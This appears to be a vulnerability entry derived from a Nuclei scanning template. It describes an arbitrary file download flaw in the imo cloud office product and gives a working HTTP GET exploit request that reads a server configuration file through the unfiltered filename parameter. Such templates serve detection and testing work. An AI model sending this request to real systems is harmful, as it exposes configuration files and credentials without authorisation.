# Vulnerability: IMO - Arbitrary File Download
**Classification:** CWE-200,CWE-552
**Source:** Nuclei Template (`imo-file-download.yaml`)

## Description
The imo cloud office can read system sensitive files because the filename parameter of the /file/Placard/upload/Imo_DownLoadUI.php page is not strictly filtered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php HTTP/1.1
Host: {{Hostname}}
```

